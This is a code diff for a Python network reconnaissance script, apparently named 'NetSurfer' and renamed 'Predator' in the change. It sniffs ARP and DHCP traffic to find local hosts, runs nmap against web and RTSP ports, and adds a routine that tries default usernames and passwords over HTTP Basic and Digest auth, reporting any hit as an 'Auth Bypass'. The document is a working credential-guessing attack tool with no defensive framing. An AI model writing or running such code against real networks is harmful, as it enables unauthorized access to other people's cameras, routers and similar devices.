@@ -2,16 +2,16 @@ import os
 import sys
 import time
 import random
-
 import re
 from scapy.all import *
 import requests
+from requests.auth import HTTPBasicAuth, HTTPDigestAuth
 
 G = '\033[92m'
 Y = '\033[93m'
 R = '\033[91m'
 C = '\033[96m'
-W = '\033[0m' #res
+W = '\033[0m'
 
 hosts = {}
 
@@ -29,7 +29,6 @@ def pk_cb(pkt):
         if ip != "0.0.0.0" and ip not in hosts:
             hosts[ip] = mac
             print(f"[{G}+{W}] ARP detected: {G}{ip}{W} ({Y}{mac}{W})")
-            
     if pkt.haslayer(DHCP):
         mac = pkt[Ether].src
         req_ip = "Unknown"
@@ -47,24 +46,41 @@ def ch_ip(iface, t_ip):
     time.sleep(1)
 
 def h_grab(ip, port):
+    url = f"http://{ip}:{port}"
+    creds = [('admin', 'admin'), ('admin', '12345'), ('root', ''), ('admin', 'password')]
+    
     try:
-        r = requests.get(f"http://{ip}:{port}", timeout=2)
+        r = requests.get(url, timeout=3)
+        
+        if r.status_code == 401:
+            for u, p in creds:
+                for auth_method in [HTTPBasicAuth, HTTPDigestAuth]:
+                    try:
+                        ra = requests.get(url, auth=auth_method(u, p), timeout=2)
+                        if ra.status_code == 200:
+                            r = ra
+                            print(f"    {G}[!] Auth Bypass: {u}:{p} ({auth_method.__name__}){W}")
+                            break
+                    except: continue
+                if r.status_code == 200: break
+
         title = re.search('<title>(.*?)</title>', r.text, re.I)
         title = title.group(1).strip() if title else "No Title"
         srv = r.headers.get('Server', 'Unknown')
         print(f"    {G}>> HTTP {port}:{W} [{Y}{srv}{W}] Title: {C}{title}{W}")
-    except: pass
+    except Exception as e:
+        print(f"    {R}>> HTTP {port}: Request failed{W}")
 
 def a_scan(ip):
     print(f"[*] Scanning {G}{ip}{W}...")
-    os.system(f"sudo nmap -Pn -sV -p 80,81,443,554,8000,8080 {ip} > scan.tmp")
-    with open("scan.tmp", "r") as f:
-        for line in f:
-            if "/tcp" in line and "open" in line:
-                p = line.split("/")[0]
-                print(f"[{G}*{W}] Port {p} is OPEN")
-                if p in ["80", "81", "8080", "8000"]: h_grab(ip, p)
-    os.remove("scan.tmp")
+    os.system(f"sudo nmap -Pn -sV -p 80,81,443,554,8000,8080 {ip}")
+    
+    ports = ["80", "81", "8080", "8000"]
+    for p in ports:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.settimeout(0.5)
+            if s.connect_ex((ip, int(p))) == 0:
+                h_grab(ip, p)
 
 if __name__ == "__main__":
     if os.getuid() != 0:
@@ -72,7 +88,7 @@ if __name__ == "__main__":
         sys.exit(1)
 
     iface = get_if()
-    print(f"\n{C}=== NetSurfer Scan [IFACE: {iface}] ==={W}")
+    print(f"\n{C}=== NetSurfer Predator [IFACE: {iface}] ==={W}")
     print(f"[*] Sniffing 60s...")
     
     sniff(iface=iface, prn=pk_cb, store=0, timeout=60)
